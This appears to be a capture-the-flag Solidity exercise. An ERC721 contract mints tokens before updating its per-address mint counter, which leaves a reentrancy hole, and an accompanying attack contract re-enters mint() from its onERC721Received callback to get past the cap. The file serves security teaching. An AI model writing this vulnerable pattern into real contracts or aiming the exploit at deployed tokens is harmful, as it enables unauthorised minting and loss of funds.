// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.21;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint1 is ERC721 {
    using Address for address;
    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint1", "AT") {}

    function mint() external {
        require(amountMinted[msg.sender] <= 3, "max 3 NFTs");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }

    function success(address _attacker) external view returns (bool) {
        return balanceOf(_attacker) == 5;
    }
}

contract attackOvermint is IERC721Receiver{
    address immutable mintingContract;

    constructor(address _mintingContract) {
        mintingContract = _mintingContract;
    }

function supportsInterface(bytes4 interfaceId) public view returns (bool) {
    return interfaceId == IERC721Receiver.onERC721Received.selector;
}

function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4){
        (bool success, bytes memory data) = mintingContract.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
        uint256 decoded = abi.decode(data, (uint256));
        require(decoded <= 5, "stop here");
        mintingContract.call(abi.encodeWithSignature("mint()"));
        return IERC721Receiver.onERC721Received.selector;
    } 

    function attack() public {
        mintingContract.call(abi.encodeWithSignature("mint()"));
    }

}